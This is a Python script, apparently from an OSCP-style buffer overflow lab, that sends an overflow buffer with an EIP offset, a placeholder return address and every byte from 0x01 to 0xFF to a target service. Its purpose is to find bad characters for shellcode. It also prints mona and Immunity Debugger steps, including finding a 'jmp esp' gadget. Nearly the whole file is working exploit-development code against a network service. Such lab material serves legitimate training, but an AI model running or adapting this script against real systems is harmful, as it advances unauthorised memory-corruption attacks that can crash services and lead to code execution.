#!/usr/bin/python3
import socket, subprocess, sys, traceback
import argparse

"""
##############################################################

	evaluate bad chars in payload by sending hex vals 
	between 01-255 and looking for corrupted bytes

##############################################################
"""

# arg parser
parser = argparse.ArgumentParser(description="find bad chars",epilog="use EIP location and bad char bytearray to determine what cannot be used for the shellcode")
parser.add_argument('-s', dest='server', type=str, help='server IP')
parser.add_argument('-p', dest='port', type=int, help='service port')
parser.add_argument('-c', dest='prefix', type=str, help='prefix / command')
parser.add_argument('-l', dest='length', type=int, help='crash buffer length')
parser.add_argument('-o', dest='offset', type=int, help='EIP offset')
parser.add_argument('-b', dest='badchars', type=str,default="", help='bad chars')


# print necessary mona setup command to generate valid line
print("Create bytearray file for mona to use in the working dir (eg: \"C:\mona\oscp\\bytearray.txt\")\n")
print("\t!mona bytearray -b \"\\x00\"i\n")


# print extended help, when no args are provided
if len(sys.argv)==1:
    parser.print_help(sys.stderr)
    print("Example use: ")
    print("\n\t./2-find-bad-chars.py -s 10.10.52.232 -p 1337 -l 2000 -c OVERFLOW1 -o 1978 -b \"\\x00\\x07\\x2e\\xa0\"\n")
    sys.exit(1)
args = parser.parse_args()


# init vars / set input
ip = args.server
port = args.port
prefix = args.prefix + " "
buflen = str( args.length + 400)
badchars = args.badchars.split("\\x")[1:]


# generate bad byte hex array
badbytes = "".join(["\\x" + "{:02x}".format(x) for x in range(1,256)])


# remove input bad chars from badbytes
print(badchars)
for char in badchars:
    badbytes = badbytes.replace("\\x"+char, "")
print(f"badbytes array length: {len(badbytes)}")
print(badbytes)


# put payload together
offset = args.offset
retn = "BBBB"
overflow = "A" * offset + "A" * ((len(prefix+retn)+offset)%4)
padding = ""
payload = bytearray.fromhex(badbytes.replace("\\x",""))
postfix = ""

buffer = (prefix + overflow +  retn + padding).encode() + payload + postfix.encode()
print(len((prefix + overflow +  retn + padding)))


# send payload
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("\n\n#######################\n")
print("Status:")
try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + ("\r\n").encode())
    print("Done!")
except Exception as e:
    traceback.print_exc()
    print(e)
    print("Could not connect.")
printbadchars ="\\x" +  "\\x".join(badchars)

# print instructions to determine bad chars with mona and repeat until no bad chars remain
print("#########################i\n")
print(f"\t1. execute the script with offset (-o) specified but without any bad bytes (-b)\n\t2. execute the following command in IMMUNITY and specify the value of ESP as the address\n\n\t\t!mona compare -f C:\mona\oscp\\bytearray.bin -a <address>\n\n\t3. Get the bad bytes from MONA output and create a new MONA bad bytes array\n\n\t\t!mona bytearray -b \"{printbadchars}\"\n\n\t4. restart this script with the additional bad bytes (-b option)\n\t5. repeat 3. and 4. until nothing changes. Remember that with consecutive bad bytes the first can flip the folllowing byte.")
print("#########################i\n")
print(f"\nFind jump point:\n\n\t!mona jmp -r esp -cpb \"{printbadchars}\"")

